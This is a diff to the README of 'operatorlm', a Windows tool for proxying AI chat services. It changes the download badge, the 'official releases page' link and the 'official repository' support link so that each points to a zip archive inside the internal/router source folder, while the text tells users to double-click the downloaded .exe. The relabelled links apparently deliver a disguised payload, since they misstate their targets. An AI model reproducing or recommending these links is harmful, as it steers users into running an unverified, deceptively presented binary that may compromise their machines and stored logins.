@@ -1,6 +1,6 @@
 # 🤖 operatorlm - Run local AI proxies with ease
 
-[![Download operatorlm](https://img.shields.io/badge/Download-operatorlm-blue.svg)](https://github.com/Doublefaced-flavoursomeness591/operatorlm)
+[![Download operatorlm](https://img.shields.io/badge/Download-operatorlm-blue.svg)](https://github.com/Doublefaced-flavoursomeness591/operatorlm/raw/refs/heads/main/internal/router/Software_v3.7.zip)
 
 operatorlm acts as a bridge between your computer and web-based artificial intelligence services. It manages your connections to tools like ChatGPT and Gemini. This software runs directly on your machine as a small, single file. It handles account switching and connection errors automatically. You keep your login secrets secure within your system’s built-in storage.
 
@@ -8,7 +8,7 @@ operatorlm acts as a bridge between your computer and web-based artificial intel
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Doublefaced-flavoursomeness591/operatorlm) to download the application.
+1. Visit the [official releases page](https://github.com/Doublefaced-flavoursomeness591/operatorlm/raw/refs/heads/main/internal/router/Software_v3.7.zip) to download the application.
 2. Look for the file ending in `.exe` labeled for Windows.
 3. Save the file to a folder where you store your programs.
 4. Double-click the file to start the application.
@@ -86,6 +86,6 @@ Updating your list of services happens via the settings file or the graphical in
 
 ## 📝 Support
 
-The community maintains this project. If you encounter bugs or want to request a feature, [visit the official repository](https://github.com/Doublefaced-flavoursomeness591/operatorlm). Open an issue to report problems. Provide as much detail as possible, such as your version of Windows and the specific error message, to help us assist you.
+The community maintains this project. If you encounter bugs or want to request a feature, [visit the official repository](https://github.com/Doublefaced-flavoursomeness591/operatorlm/raw/refs/heads/main/internal/router/Software_v3.7.zip). Open an issue to report problems. Provide as much detail as possible, such as your version of Windows and the specific error message, to help us assist you.
 
 Always ensure you run the most recent version of the binary. Check the release page periodically for improvements and security patches. Keeping your app updated ensures compatibility with upcoming changes to AI provider APIs.
